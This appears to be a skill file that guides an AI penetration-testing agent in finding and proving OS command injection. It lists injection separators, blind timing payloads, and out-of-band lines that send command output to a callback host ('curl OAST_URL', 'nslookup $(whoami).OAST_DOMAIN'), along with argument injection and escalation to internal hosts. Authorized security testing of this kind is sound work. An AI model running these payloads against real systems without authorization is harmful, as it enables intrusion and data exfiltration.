---
name: cmdi
class: cmdi
summary: Find, exploit, and prove OS command injection / RCE (in-band, blind, OOB).
---
# OS Command Injection (RCE)

Proven by executing an attacker-chosen command on the target and observing
unambiguous evidence — non-destructively (run `id`, not `rm`).

## Attack surface
- Parameters flowing into a shell/exec: ping/traceroute, image/PDF/video convert
  (ImageMagick, ffmpeg), archive/backup, git/svn wrappers, filename/path args,
  SSRF-adjacent "fetch URL" features, notification/webhook shell-outs.
- Argument injection (no shell metachar needed): a value becomes a flag
  (`--output`, `-o`, `@file`) to the invoked binary.

## Recon
- Identify the invoked binary and OS from tech fingerprint/errors.
- Baseline the normal response/timing for a benign value.

## Techniques (escalate)
1. **Separators/operators**: `;id`, `| id`, `&& id`, `$(id)`, `` `id` ``,
   newline-prefixed; URL-encode as needed.
2. **In-band proof**: run `id` (expect `uid=..(..) gid=..`), `uname -a`, or read a
   canary file; the command output in the response = RCE.
3. **Blind — time**: `;sleep 5` / `& ping -c 5 127.0.0.1`; confirm the delay scales.
4. **Blind — OOB**: `;curl OAST_URL`, `;nslookup OAST_DOMAIN`, exfil command output
   into the callback subdomain (`nslookup $(whoami).OAST_DOMAIN`); poll the OAST server.
5. **Argument injection**: e.g. inject `-o /path` or a config flag the binary honors.
- Delegate bulk/scripted attempts to the `task` sub-agent; use the free shell to
  run and iterate curl/scripts.

## Escalation (in-scope, non-destructive)
- From confirmed RCE, prove blast radius: enumerate reachable in-scope internal
  services/hosts (read/prove only). No persistence, no data destruction, no
  out-of-scope pivot.

## Proof ladder
- L1: payload accepted. L2: timing hint only. L3: real command output (`id`) OR an
  OOB callback = RCE proven. L4: chained/critical (reachable-internal, cred access).

## Validation / false positives
- A delay can be network jitter — require scaling delays + a fast control.
- Reflected payload text ≠ execution; require command *output* or OOB.
- Confirm the output isn't attacker-supplied echo (use a computed command like
  `expr 7 \* 7` or `id`, whose output the attacker can't have pre-placed).
